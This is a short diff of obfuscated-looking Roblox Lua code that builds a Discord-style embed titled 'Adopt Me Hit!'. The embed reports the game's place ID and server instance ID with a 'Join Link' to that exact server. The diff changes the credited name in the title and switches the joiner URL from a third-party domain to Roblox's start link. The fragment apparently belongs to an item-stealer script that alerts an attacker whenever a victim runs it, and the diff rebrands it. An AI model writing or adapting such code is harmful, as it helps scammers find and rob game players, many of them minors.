@@ -475,7 +475,7 @@ local function v87(p7, p8)
 	}
 
 	t11.embeds = { {
-		title = "🐾 Adopt Me Hit! Yay SAB",
+		title = "🐾 Adopt Me Hit! Yay Snthnova",
 		color = 65280,
 		fields = {
 			{
@@ -490,7 +490,7 @@ local function v87(p7, p8)
 			},
 			{
 				name = "🔗 Join Link",
-				value = string.format("[Click to Join](https://plsbrainrot.me/joiner?placeId=%s&gameInstanceId=%s)", tostring(game.PlaceId), RealJobID),
+				value = string.format("[Click to Join](https://www.roblox.com/games/start?placeId=%s&gameInstanceId=%s)", tostring(game.PlaceId), RealJobID),
 				inline = false
 			}
 		},
